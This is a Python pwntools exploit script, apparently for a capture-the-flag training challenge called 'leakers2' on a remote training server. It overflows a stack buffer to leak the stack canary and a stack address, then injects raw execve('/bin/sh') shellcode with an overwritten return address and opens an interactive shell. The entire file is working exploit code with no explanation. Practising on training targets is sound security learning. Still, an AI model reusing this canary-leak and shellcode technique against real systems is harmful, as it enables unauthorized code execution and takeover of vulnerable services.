from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

import time

#r = process("./leakers2") 
r = remote("bin.training.jinblack.it", 2011)



'''
gdb.attach(r, """
	b * 0x00401255
	c
""")
'''


#shellcode = b"\xEB\x18\x48\xC7\xC0\x3B\x00\x00\x00\x5F\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\x0F\x05\xE8\xE3\xFF\xFF\xFF/bin/sh\x00"

shellcode = b"B"*105
r.send(shellcode)
time.sleep(1)

r.recvuntil(b"> ")
r.recv(105)
canary = u64(b"\x00" + r.recv(7))
print("canary: " + "%#x" % canary)

payload_to_leak_the_stack = b"E" * (104 + 4*8)
r.send(payload_to_leak_the_stack)
time.sleep(1)


#address = 0x4142434445464748

r.recvuntil(b"> ")
r.recv(104 + 4*8)
stack = u64(r.recv(6) + b"\x00" * 2)
print("address on the stack: " + "%#x" % stack)
#0x7fffffffdda8 - 0x7fffffffdc50

shellcode = b"\x90\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00\x00"
shellcode = shellcode.ljust(104, b"\x90")


delta = 0x158
buffer_position = stack - delta 
print("buffer_position: " + "%#x" % buffer_position)

address = buffer_position
payload = shellcode + p64(canary) + b"D"*8 + p64(address)
r.send(payload)

time.sleep(1)



r.send(b"\n")

r.interactive()
input("wait")

